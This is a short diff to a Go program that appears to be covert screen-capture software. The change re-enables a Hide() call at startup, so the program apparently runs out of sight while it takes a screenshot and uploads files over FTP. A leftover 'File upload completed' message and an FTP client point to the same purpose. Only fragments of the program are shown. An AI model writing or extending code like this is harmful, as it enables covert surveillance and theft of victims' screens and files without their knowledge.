@@ -25,7 +25,7 @@ func listFilesInDir(dirPath string) ([]string, error) {
 
 func main() {
 
-	//Hide()
+	Hide()
 
 	//Take screenshot
 	screenshotPath := "screenshot.png" // Where save the screenshot
@@ -87,6 +87,6 @@ func main() {
 
 	/*fmt.Println("File upload completed.")
 	fmt.Println("Press any key to close...")
-	fmt.Scanln()*/
+	fmt.Scanln()*/ //Uncomment during debug testing
 	defer ftpClient.Quit()
 }
